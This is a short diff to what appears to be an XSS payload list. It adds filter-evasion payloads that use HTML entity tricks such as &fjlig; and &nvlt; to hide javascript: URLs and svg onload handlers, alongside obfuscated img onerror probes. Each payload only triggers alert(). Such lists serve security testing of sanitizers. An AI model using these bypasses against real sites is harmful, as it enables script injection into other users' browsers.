@@ -1,3 +1,10 @@
+<a onclick="location.href='\&fjlig;avascript:alert(1)'">go</a>
+<a onclick="location.href='\&fjlig;javascript:alert(1)'">go</a>
+'\&fjlig;avascript:alert(1)'
+'\&fjlig;javascript:alert(1)'
+&nvlt;svg onload=alert(1)>
+<iframe src-doc="<svg onload=alert(1)&nvgt;"></iframe>
+<svg onload=alert(1)&nvgt;
 <img+src=oNlY=1+ onerror="alert(['a', 'x', 'b', 'x', 'c', 's'].map(c => c.replace(/[abc]/g, '')).join(''))">
 <img+src=oNlY=1+ onerror="alert(['x', String.fromCharCode(121), 'x', 's'].filter(c => c.charCodeAt(0) !== 121).join(''))">
 parent[/al/.source.concat(/ert/.source)](2)
